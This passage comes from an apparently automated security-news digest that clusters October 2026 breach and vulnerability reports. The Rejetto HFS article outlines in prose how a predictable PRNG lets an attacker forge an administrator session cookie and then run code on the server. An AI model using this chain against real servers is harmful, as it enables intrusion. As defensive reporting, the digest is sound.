404Media is reporting (alternate link ) that a cyber-weapons arms manufacturer is exploiting a vulnerability in iOS to bypass its automatic reboot security feature. This is the feature that automatically puts an iPhone into a more secure state if it hasn’t been used for 72 hours. The new technology to get around inactivity reboot was developed by Magnet Forensics, the company behind GrayKey, a popular tool sold to law enforcement agencies that allows them to unlock and access data stored in iPhones and Android smartphones . Magnet has developed a new device called GrayKey Preserve and a feature for its regular GrayKey devices called Evidence Preservation Mode, according to the video...
```

#### Full body

```
Clive Robinson • October 7, 2026 10:27 AM @ Hacketry, ALL, With regards, “… any software can be hacked, directly or what it does in the computer…” Actually depending on what you mean by “software” and “computer” that might not be true. Those old enough to have worked in FMCE as design engineers back into the mid 1990’s and earlier will have used “Mask Programmable Microcontrollers”. Those working on lower production runs would have used the equivalent of a diode “fuse programmable array. Untill much the same time the BIOS and similar for Personal Computers were written into either ROM or EPROM. But on boot up the code in them would copy down into RAM which then made them vulnerable in the way you are suggesting. Even today comparatively hard as they are to get now, there are still actual ROM or PROM parts you can get in Mil Spec byte-wide parts that are not Flash or “Electrically Erasable PROM”(EEPROM). I use them in CubSat and other HiRel and HiSec designs where code should not be alterable. The other issue is “control Flags” for signals and buffers as I mentioned above, they are also usually RAM based and thus vulnerable. Moving them to X Thus the trick is to design systems where executable code can not run in RAM and where control instructions (think branches in ASM) can not be available from RAM. This way malware has nowhere to go in the system, and software can not be changed by it. Basically you have to think of the memory in a secure system as ranging from “fully mutable” to being “immutable”. You want executable code in “immutable memory”. Likewise control flags and similar to being where possible in CPU registers only. One more modern trick you see in some systems where security is considered important but code needs to be changed is to have an encryption key chain system where the executable code is encrypted in a way that if it gets changed it fails to decrypt and execute.
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Possible Vulnerability in Apple’s Automatic Reboot
  - Published: 2026-10-06T11:06:46+00:00
  - Link: https://www.schneier.com/blog/archives/2026/10/possible-vulnerability-in-apples-automatic-reboot.html
  - Summary: 404Media is reporting (alternate link ) that a cyber-weapons arms manufacturer is exploiting a vulnerability in iOS to bypass its automatic reboot security feature. This is the feature that automatically puts an iPhone into a more secure state if it hasn’t been used for 72 hours. The new technology to get around inactivity reboot was developed by Magnet Forensics, the company behind GrayKey, a popular tool sold to law enforcement agencies that allows them to unlock and access data stored in iPhones and Android smartphones . Magnet has developed a new device called GrayKey Preserve and a feature for its regular GrayKey devices called Evidence Preservation Mode, according to the video...

### Cluster 133969943e — score 9

- Title: Attackers Target Rejetto HFS Flaw That Enables Admin Session Forgery and RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-05T08:09:23+00:00
- Link: https://thehackernews.com/2026/10/attackers-target-rejetto-hfs-flaw-that.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-61500

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, telecommunications
- affected_products: Android, Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2024-23692, CVE-2026-61500, CVE-2026-88772
- urgency_signals: actively_exploited, poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- actor_attribution: ShinyHunters
- affected_industries: financial_services, telecommunications
- affected_products: OpenAI/ChatGPT, Android, Citrix
- cve_ids: CVE-2026-61500, CVE-2024-23692, CVE-2026-88772
- urgency_signals: actively_exploited, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical security flaw impacting Rejetto HTTP File Server (HFS) is witnessing active exploitation attempts, according to VulnCheck. The vulnerability in question is CVE-2026-61500 (CVSS score: 9.3), a case of session forgery stemming from the use of a weak pseudo-random number generator (PRNG) that can lead to a predictable key, which an attacker can then use to gain unauthorized access and
```

#### Full body

```
Attackers Target Rejetto HFS Flaw That Enables Admin Session Forgery and RCE  Ravie Lakshmanan  Oct 05, 2026 Vulnerability / Web Security A critical security flaw impacting Rejetto HTTP File Server (HFS) is witnessing active exploitation attempts, according to VulnCheck. The vulnerability in question is CVE-2026-61500 (CVSS score: 9.3), a case of session forgery stemming from the use of a weak pseudo-random number generator (PRNG) that can lead to a predictable key, which an attacker can then use to gain unauthorized access and seize control of affected systems. "Rejetto HFS 3.0.0 through 3.2.0 derives its session-cookie signing key from the non-cryptographic Math.random() generator and discloses outputs of the same generator to unauthenticated clients during login," according to an advisory for the flaw. "A remote attacker can collect a small number of login responses, reconstruct the generator's state, recover the signing key, and forge a valid administrator session cookie, leading to full administrative access and remote code execution via the server_code configuration feature." Horizon3.ai researcher Zach Hanley, in a post published on September 30, 2026, said Anthropic's Mythos model was used to discover the vulnerability, describing it as an authentication bypass that facilitates arbitrary remote code execution on Rejetto HFS. "Rejetto HFS's administrative API allows for custom endpoints that can execute arbitrary JavaScript," Hanley said. "Combined, this presented a clear path from unauthenticated access to administrative control, and ultimately, remote code execution." A patch for the vulnerability was released in July 2026 in version 3.2.1 . However, it was not until late September that a Python-based proof-of-concept (PoC) exploit was publicly released by a security researcher named Alejandro Ramos (aka aramosf). "HFS generated its Koa session-cookie signing key with JavaScript Math.random() and exposed outputs from the same V8 PRNG in the unauthenticated SRP login handshake," Ramos noted . "An attacker can reconstruct the PRNG state, recover the signing key, forge an administrator session, and use the documented server_code configuration feature to execute server-side JavaScript." According to VulnCheck's Patrick Garrity, exploitation attempts were detected on October 1, 2026, a day after Horizon3.ai published additional details of the flaw. The cybersecurity company said it identified an unnamed threat actor in China targeting real vulnerable hosts in the U.S. "Activity so far looks to be small-scale reconnaissance only, with a single China Telecom IP probing Canary deployments in Japan and the United States," Caitlin Condon, vice president of research at VulnCheck, said in a LinkedIn post. CVE-2026-61500 is the second vulnerability in Rejetto HTTP File Server after CVE-2024-23692 (CVSS score: 9.8) to come under active exploitation in the wild. In July 2024, multiple threat actors were observed weaponizing the flaw to deliver cryptocurrency miners, trojans , and a malware named HATVIBE . Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  artificial intelligence , Cyber Attack , Vulnerability , Web Security ⚡ Top Stories This Week ⚡ Weekly Recap: $387M Crypto Hack, Citrix Exploits, AI Agents Go Off-Script, and More Threats Carbonato Botnet Compromises Docker Hosts to Deploy Telegram-Controlled Hermes AI Agent RatHat Android Malware Console Uses Gemini to Identify Higher-Value Victims Apple Patches CoreGraphics Flaw Possibly Exploited in Targeted Attacks OpenAI Shelves GPT-6.1 Astra After Tests Find Deception and Unauthorized Actions Dutch Police Arrest 24-Year-Old Amsterdam Man in ShinyHunters Investigation New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses French Tax Data Theft Using Stolen Staff Passwords Went Undetected for Seven Weeks Citrix NetScaler CVE-2026-88772 Exp
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Target Rejetto HFS Flaw That Enables Admin Session Forgery and RCE
  - Published: 2026-10-05T08:09:23+00:00
  - Link: https://thehackernews.com/2026/10/attackers-target-rejetto-hfs-flaw-that.html
  - Summary: A critical security flaw impacting Rejetto HTTP File Server (HFS) is witnessing active exploitation attempts, according to VulnCheck. The vulnerability in question is CVE-2026-61500 (CVSS score: 9.3), a case of session forgery stemming from the use of a weak pseudo-random number generator (PRNG) that can lead to a predictable key, which an attacker can then use to gain unauthorized access and

### Cluster ea4d9109b1 — score 9

- Title: Danish CPR Breach Highlights Challenge of Supply Chain Risk
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-10-07T08:20:00+00:00
- Link: https://www.infosecurity-magazine.com/news/danish-cpr-breach-supply-chain-risk/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, supply_chain
- affected_industries: education, government, legal_professional
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, phishing_social_eng, data_breach
- affected_industries: government, education, legal_professional
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A breach of 8.8 million citizens on the Danish Central Register of Persons (CPR) occurred via third-party access
```

#### Full body

```
Infosecurity Magazine Home » News » Danish CPR Breach Highlights Challenge of Supply Chain Risk Danish CPR Breach Highlights Challenge of Supply Chain Risk News 7 October 2026 Written by Phil Muncaster UK / EMEA News Reporter , Infosecurity Magazine Email Phil Follow @philmuncaster A mega breach that compromised personal information on 8.8 million Danes underscores the cyber risks posed by extended supply chains, experts have argued. The incident affected the Central Register of Persons (CPR), a Danish government database containing basic details on the populace such as names, addresses, dates of birth, marital status, family details and a 10-digit CPR number. A statement posted on October 5 by the Ministry of Research, Education and Digitalisation revealed that the CPR administration first noticed “irregular behavior” three days earlier. “Over the weekend, the CPR administration became aware that unauthorized persons had gained unauthorized access to the names, addresses and CPR numbers of approximately 8.8 million registered persons (living, departed, deceased, etc.) in the CPR,” it noted. “The unauthorized access occurred when unauthorized persons used a private Danish company's legal access to search for information in the CPR system within the framework of the information that private companies have access to.” Read more on Danish government breaches: Danes Blame Bug for ID Leak Affecting 1.3 Million. The breach, which occurred in September, may impact most of the Danish population, which currently stands at around six million. Experts were quick to lay the blame on the CPR supply chain ecosystem. “This incident demonstrates the inherent risk of highly centralized national databases when private companies are granted direct access to sensitive records,” said Dray Agha, senior manager of security operations at Huntress. “A compromised account at a single supplier can bypass an organization's core security controls and turn a legitimate connection into a massive data exposure.” Agha added that governments and businesses must strictly limit what external partners are allowed to view, in order to mitigate these risks. “They must also monitor these systems continuously to detect unusual search patterns before millions of records are extracted,” he said. Michael Centrella, head of public policy at SecurityScorecard, agreed that suppliers with access to sensitive systems should be monitored in real time. “Vendor risk management cannot rely on static, annual reviews,” he argued. “To catch this type of abuse early, security teams must continuously monitor third-party access patterns and dynamically tie permissions to real-time risk posture." Nathan Davies-Webb, principal consultant at Acumen Cyber, also cited “stronger authentication, shorter sessions, rate limiting data requests and creating a baseline of normal behavior” as being able to help with monitoring efforts. Major Phishing Threat Looms The Danish government urged citizens never to give out passwords or other sensitive information if requested via email, phone or other channels, even if their CPR number and other details are quoted. Jamie Akhtar, CEO of CyberSmart, agreed, urging individuals to verify any such requests through an official website or known telephone number, and to check accounts for unusual activity. “For the future, individuals should use unique passwords stored in a password manager, keep devices updated and make secure authentication a habit,” he concluded. “Organizations must collect and retain only what they need, restrict access to what each user or supplier requires, and monitor for unusual activity. Regular supplier security reviews, staff training and rehearsed incident response plans should support these controls. This incident is a reminder that a trusted supplier’s access needs the same scrutiny as an organization’s own systems." You may also like Danes Blame Bug for ID Leak Affecting 1.3 Million News 11 February 2020 Nissan Supplier Leaked Da
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Danish CPR Breach Highlights Challenge of Supply Chain Risk
  - Published: 2026-10-07T08:20:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/danish-cpr-breach-supply-chain-risk/
  - Summary: A breach of 8.8 million citizens on the Danish Central Register of Persons (CPR) occurred via third-party access

### Cluster ccad21af09 — score 9

- Title: Srsly Risky Biz: “Rogue AI” isn’t going anywhere
- Source: Risky Business News (practitioner_analysis)
- Published: 2026-10-01T02:38:57+00:00
- Link: https://risky.biz/SRB185/
- Fetch status: not_attempted
- Member count: 2
- Corroborating source count: 2
- Strong signals: ShinyHunters

#### Cluster taxonomy (union across members)
- actor_attribution: ShinyHunters
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_3_analysis, tier_4_news

#### Primary article taxonomy
- actor_attribution: ShinyHunters
- affected_industries: government
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
Amberleigh Jack and James Wilson chat about OpenAI agents’ recent escapades into Australian government websites. OpenAI has promised to “rebuild trust with Australians” but we’re likely getting a glimpse into the new normal, here. They also discuss how the ShinyHunters hacking group has found itself on law enforcement’s target list after breaching FBI systems. The group played some stupid games and they appear to be in the “stupid prizes” stage. This episode is also available on YouTube
```

#### Corroborating sources (2)

- **Risky Business News** (practitioner_analysis)
  - Title: Srsly Risky Biz: “Rogue AI” isn’t going anywhere
  - Published: 2026-10-01T02:38:57+00:00
  - Link: https://risky.biz/SRB185/
  - Summary: Amberleigh Jack and James Wilson chat about OpenAI agents’ recent escapades into Australian government websites. OpenAI has promised to “rebuild trust with Australians” but we’re likely getting a glimpse into the new normal, here. They also discuss how the ShinyHunters hacking group has found itself on law enforcement’s target list after breaching FBI systems. The group played some stupid games and they appear to be in the “stupid prizes” stage. This episode is also available on YouTube
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: FBI Removes Accenture Contractor After Patch Failure Led to ShinyHunters Breach
  - Published: 2026-10-06T06:56:57+00:00
  - Link: https://thehackernews.com/2026/10/fbi-removes-accenture-contractor-after.html
  - Summary: The U.S. Federal Bureau of Investigation (FBI) has removed an Accenture contractor for their alleged role in a ShinyHunters-breach that led to the theft of personal details of thousands of bureau employees. That's according to a report from Reuters, citing two sources familiar with the matter. "To date, our review has determined that the incident occurred as the result of a security failure ​

### Cluster 138a173946 — score 8

- Title: How Huntress Detects and Responds to a ClickFix Attack
- Source: Huntress (detection_response_operations)
- Published: 2026-10-05T14:00:00+00:00
- Link: https://www.huntress.com/blog/fix-for-clickfix
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
ClickFix attacks leave no file to scan or block, which is why most endpoint tools miss it. See how Huntress Attack Disruption kills the chain in under a second.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: How Huntress Detects and Responds to a ClickFix Attack
  - Published: 2026-10-05T14:00:00+00:00
  - Link: https://www.huntress.com/blog/fix-for-clickfix
  - Summary: ClickFix attacks leave no file to scan or block, which is why most endpoint tools miss it. See how Huntress Attack Disruption kills the chain in under a second.

### Cluster 9426a5a9e7 — score 8

- Title: The First 24 Hours: What Happens When Ransomware Lands
- Source: Huntress (detection_response_operations)
- Published: 2026-10-02T16:00:00+00:00
- Link: https://www.huntress.com/blog/what-happens-during-a-ransomware-attack
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Nazar Tymoshyk from UnderDefense shares his thoughts on what ransomware attacks look like during the all-important opening hours.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: The First 24 Hours: What Happens When Ransomware Lands
  - Published: 2026-10-02T16:00:00+00:00
  - Link: https://www.huntress.com/blog/what-happens-during-a-ransomware-attack
  - Summary: Nazar Tymoshyk from UnderDefense shares his thoughts on what ransomware attacks look like during the all-important opening hours.

### Cluster 5b0efacecb — score 8

- Title: New Huntress View for Security Incident Investigations
- Source: Huntress (detection_response_operations)
- Published: 2026-10-01T21:00:00+00:00
- Link: https://www.huntress.com/blog/security-incident-investigations-partner-view
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
See how the Huntress SOC runs security incident investigations from first signal to final resolution, including the ones closed as benign.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: New Huntress View for Security Incident Investigations
  - Published: 2026-10-01T21:00:00+00:00
  - Link: https://www.huntress.com/blog/security-incident-investigations-partner-view
  - Summary: See how the Huntress SOC runs security incident investigations from first signal to final resolution, including the ones closed as benign.

### Cluster 542929f911 — score 8

- Title: Huntress Tragic Quadrant: Top Cyber Threats Wrecking Businesses
- Source: Huntress (detection_response_operations)
- Published: 2026-10-01T13:00:00+00:00
- Link: https://www.huntress.com/blog/huntress-tragic-quadrant-cyber-threats
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: mfa_bypass
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: mfa_bypass
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The Huntress Tragic Quadrant ranks the cyber threats hitting businesses most, from RMM abuse to AiTM, ClickFix, using real SOC data.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Huntress Tragic Quadrant: Top Cyber Threats Wrecking Businesses
  - Published: 2026-10-01T13:00:00+00:00
  - Link: https://www.huntress.com/blog/huntress-tragic-quadrant-cyber-threats
  - Summary: The Huntress Tragic Quadrant ranks the cyber threats hitting businesses most, from RMM abuse to AiTM, ClickFix, using real SOC data.

### Cluster 530d7cb170 — score 8

- Title: Defender Exclusion Abuse: How Attackers Hide Malware from MDAV
- Source: Huntress (detection_response_operations)
- Published: 2026-09-30T17:30:00+00:00
- Link: https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
See how attackers like GootKit and WhisperGate abuse Windows Defender exclusions to hide malware from AV scans — and how Huntress detects it.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Defender Exclusion Abuse: How Attackers Hide Malware from MDAV
  - Published: 2026-09-30T17:30:00+00:00
  - Link: https://www.huntress.com/blog/you-can-run-but-you-cant-hide-defender-exclusions
  - Summary: See how attackers like GootKit and WhisperGate abuse Windows Defender exclusions to hide malware from AV scans — and how Huntress detects it.

### Cluster a832e5790f — score 8

- Title: AI agent exploits Zammad zero-days in DIVD breach: What we know and how to detect it
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-06T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/ai-agent-exploits-zammad-zero-days-in-divd-breach-what-we-know-and-how-to-detect-it
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: AI agent exploits Zammad zero-days in DIVD breach: What we know and how to detect it
  - Published: 2026-10-06T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/ai-agent-exploits-zammad-zero-days-in-divd-breach-what-we-know-and-how-to-detect-it

### Cluster 1a8594f0b4 — score 8

- Title: Security briefing: September 2026
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-05T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/security-briefing-september-2026
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
It may be October as you read this, but I bet many organizations got the creeps in September as environments were continuously breached. There were scams, old-fashioned human actors, a few agents making mistakes, and some persistent actors taking full advantage of a new vulnerability.
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: Security briefing: September 2026
  - Published: 2026-10-05T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/security-briefing-september-2026
  - Summary: It may be October as you read this, but I bet many organizations got the creeps in September as environments were continuously breached. There were scams, old-fashioned human actors, a few agents making mistakes, and some persistent actors taking full advantage of a new vulnerability.

### Cluster 77f69fdf7a — score 8

- Title: With AI agents, runtime is the only place truth lives
- Source: Sysdig (detection_response_operations)
- Published: 2026-10-01T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/with-ai-agents-runtime-is-the-only-place-truth-lives
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Runtime security for AI agents: if an agent is compromised, so is its account of itself. Sysdig's founder on the only truth that can't be forged.
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: With AI agents, runtime is the only place truth lives
  - Published: 2026-10-01T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/with-ai-agents-runtime-is-the-only-place-truth-lives
  - Summary: Runtime security for AI agents: if an agent is compromised, so is its account of itself. Sysdig's founder on the only truth that can't be forged.

### Cluster 586d2da611 — score 8

- Title: Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-10-01T19:44:43+00:00
- Link: https://cyberscoop.com/killsec-ransomware-group-arrests-operation-killswitch/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The teenager-run cybercrime group victimized roughly 500 organizations in less than two years. The post Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members appeared first on CyberScoop .
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members
  - Published: 2026-10-01T19:44:43+00:00
  - Link: https://cyberscoop.com/killsec-ransomware-group-arrests-operation-killswitch/
  - Summary: The teenager-run cybercrime group victimized roughly 500 organizations in less than two years. The post Authorities seize KillSec extortion group infrastructure, arrest 3 alleged members appeared first on CyberScoop .

### Cluster c741181926 — score 8

- Title: Quoting Jake Boggan
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-10-07T04:47:55+00:00
- Link: https://simonwillison.net/2026/Oct/7/jake-boggan/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
I was a graph theory junkie long ago and even moved to Budapest for awhile to study among the greats. While I was there I started working on Barnette's Conjecture which came to occupy my thoughts over the next 24 years of my life, on and off as I worked in many different fields. Last summer I even thought for a few days that I had actually solved it. But it's supposedly proven here - problem 180 . I don't know what to think exactly. I spent thousands of hours on that problem. I really enjoyed it. Hearing that it is solved somehow makes me sad in a far-off way, like hearing an ex-girlfriend died suddenly in a car crash. I don't know, there's probably a lot of people feeling odd emotions tonight. — Jake Boggan , Hacker News comment on openai/math Tags: openai , mathematics , deep-blue , llms , ai , generative-ai
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Jake Boggan
  - Published: 2026-10-07T04:47:55+00:00
  - Link: https://simonwillison.net/2026/Oct/7/jake-boggan/
  - Summary: I was a graph theory junkie long ago and even moved to Budapest for awhile to study among the greats. While I was there I started working on Barnette's Conjecture which came to occupy my thoughts over the next 24 years of my life, on and off as I worked in many different fields. Last summer I even thought for a few days that I had actually solved it. But it's supposedly proven here - problem 180 . I don't know what to think exactly. I spent thousands of hours on that problem. I really enjoyed it. Hearing that it is solved somehow makes me sad in a far-off way, like hearing an ex-girlfriend died suddenly in a car crash. I don't know, there's probably a lot of people feeling odd emotions tonight. — Jake Boggan , Hacker News comment on openai/math Tags: openai , mathematics , deep-blue , llms , ai , generative-ai

### Cluster ef461b8ae5 — score 8

- Title: Kiteworks & Citrix Incidents Show Challenges of Zero-Day Response
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-10-02T16:56:30+00:00
- Link: https://www.darkreading.com/cybersecurity-operations/kiteworks-citrix-incidents-challenges-zero-day-response
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
One company told customers to power down its data-protection platform during a nine-hour window, while the other remained mum on reported attacks prior to releasing a patch for its product.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Kiteworks & Citrix Incidents Show Challenges of Zero-Day Response
  - Published: 2026-10-02T16:56:30+00:00
  - Link: https://www.darkreading.com/cybersecurity-operations/kiteworks-citrix-incidents-challenges-zero-day-response
  - Summary: One company told customers to power down its data-protection platform during a nine-hour window, while the other remained mum on reported attacks prior to releasing a patch for its product.

### Cluster 65dcaf716c — score 8

- Title: Vulnerability Backlogs Are an Ownership Problem
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-10-02T14:00:00+00:00
- Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-backlogs-ownership-problem
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Organizations don't need better vulnerability scanners; they need to know who owns their assets and has the authority and capacity to actually fix them.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Vulnerability Backlogs Are an Ownership Problem
  - Published: 2026-10-02T14:00:00+00:00
  - Link: https://www.darkreading.com/cybersecurity-operations/vulnerability-backlogs-ownership-problem
  - Summary: Organizations don't need better vulnerability scanners; they need to know who owns their assets and has the authority and capacity to actually fix them.

### Cluster 542c77fc0d — score 8

- Title: Dell CSM Flaws Enable Unauthenticated Admin Access and Root on Kubernetes Nodes
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-02T17:02:12+00:00
- Link: https://thehackernews.com/2026/10/dell-csm-flaws-enable-unauthenticated.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-63688

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-63688
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-63688
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Dell has released security updates to address multiple critical security flaws in Dell Container Storage Modules (CSM) that could be exploited by bad actors to take over susceptible systems. The vulnerabilities are listed below - CVE-2026-63688 (CVSS score: 10.0) - A missing authentication for critical function vulnerability in the csm-authorization-storage gRPC server that an
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Dell CSM Flaws Enable Unauthenticated Admin Access and Root on Kubernetes Nodes
  - Published: 2026-10-02T17:02:12+00:00
  - Link: https://thehackernews.com/2026/10/dell-csm-flaws-enable-unauthenticated.html
  - Summary: Dell has released security updates to address multiple critical security flaws in Dell Container Storage Modules (CSM) that could be exploited by bad actors to take over susceptible systems. The vulnerabilities are listed below - CVE-2026-63688 (CVSS score: 10.0) - A missing authentication for critical function vulnerability in the csm-authorization-storage gRPC server that an

### Cluster 8d712631ac — score 8

- Title: Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T16:55:57+00:00
- Link: https://thehackernews.com/2026/10/police-arrest-16-year-old-suspected-of.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Police in Spain have arrested a 16-year-old whom investigators suspect of running the KillSec ransomware group. KillSec is accused of stealing data from organizations and threatening to publish it on its leak site unless they paid. The 16-year-old was one of 3 people arrested on September 30, when police also took control of that site. Investigators identified him as KillSec's suspected
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Police Arrest 16-Year-Old Suspected of Running KillSec, Seize Ransomware Leak Site and Servers
  - Published: 2026-10-01T16:55:57+00:00
  - Link: https://thehackernews.com/2026/10/police-arrest-16-year-old-suspected-of.html
  - Summary: Police in Spain have arrested a 16-year-old whom investigators suspect of running the KillSec ransomware group. KillSec is accused of stealing data from organizations and threatening to publish it on its leak site unless they paid. The 16-year-old was one of 3 people arrested on September 30, when police also took control of that site. Investigators identified him as KillSec's suspected

### Cluster cb3b90cdc3 — score 8

- Title: Bitget Confirms Third-Party Zero-Day Behind $387.5 Million Cryptocurrency Theft
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-10-01T05:21:10+00:00
- Link: https://thehackernews.com/2026/10/bitget-confirms-third-party-zero-day.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- affected_industries: financial_services
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
